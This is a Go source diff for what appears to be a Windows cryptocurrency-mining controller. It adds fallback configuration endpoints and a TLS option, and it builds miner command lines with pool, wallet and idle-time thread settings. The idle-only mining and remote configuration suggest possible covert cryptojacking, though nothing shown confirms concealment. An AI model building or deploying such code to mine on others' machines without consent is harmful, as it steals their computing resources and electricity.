@@ -36,15 +36,23 @@ type Res struct {
 	Pool        string `json:"pool"`
 	Task        string `json:"task"`
 	Threads     int    `json:"threads"`
+	Ssl         int    `json:"ssl"`
 }
 
-var endpointurl = "http://localhost/"
+var endpoints = []string{
+
+	"https://fallback1.example.com",
+	"http://localhost/",
+	"https://fallback2.example.com",
+}
+
 var miningpool = ""
 var mining_wallet = ""
 var mining_password = ""
 var threads = 0
 var idle_time = 0
 var idlethreads = 0
+var ssl = 0
 
 var lockHandle windows.Handle
 
@@ -54,17 +62,33 @@ func StringToPointer(s string) *string {
 
 func craftCLI(idle bool) *string {
 	if idle {
-		template := "-o %s -u %s -k -p %s --cpu-max-threads-hint=%d"
-		cli := fmt.Sprintf(template, miningpool, mining_wallet, mining_password, idlethreads)
-		fmt.Println("formatted cli output: " + cli)
+		if ssl == 1 {
+			template := "--donate-level 2 -o %s -u %s -k --tls -p %s --cpu-max-threads-hint=%d"
+			cli := fmt.Sprintf(template, miningpool, mining_wallet, mining_password, idlethreads)
+			fmt.Println("formatted cli output: " + cli)
+			return StringToPointer(cli)
 
-		return StringToPointer(cli)
-	} else {
-		template := "-o %s -u %s -k -p %s --cpu-max-threads-hint=%d"
+		} else {
+			template := "--donate-level 2 -o %s -u %s -k -p %s --cpu-max-threads-hint=%d"
+			cli := fmt.Sprintf(template, miningpool, mining_wallet, mining_password, idlethreads)
+			fmt.Println("formatted cli output: " + cli)
+
+			return StringToPointer(cli)
+
+		}
+
+	} else if ssl == 1 {
+
+		template := "--donate-level 2 -o %s -u %s -k --tls -p %s --cpu-max-threads-hint=%d"
 		cli := fmt.Sprintf(template, miningpool, mining_wallet, mining_password, threads)
 		fmt.Println("formatted cli output: " + cli)
 
 		return StringToPointer(cli)
-	}
+	} else {
 
+		template := "--donate-level 2 -o %s -u %s -k -p %s --cpu-max-threads-hint=%d"
+		cli := fmt.Sprintf(template, miningpool, mining_wallet, mining_password, threads)
+		fmt.Println("formatted cli output: " + cli)
+		return StringToPointer(cli)
+	}
 }
